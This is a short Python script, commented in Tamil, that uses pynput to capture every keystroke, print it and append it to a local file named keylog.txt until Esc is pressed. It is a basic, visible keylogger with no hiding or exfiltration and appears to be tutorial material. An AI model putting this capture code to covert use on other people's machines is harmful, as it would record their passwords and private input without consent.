from pynput.keyboard import Key, Listener

def on_press(key):
    print(key)  # Screen-ல காட்டு
    
    # File-ல save பண்ணு
    with open("keylog.txt", "a") as f:
        f.write(str(key) + "\n")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
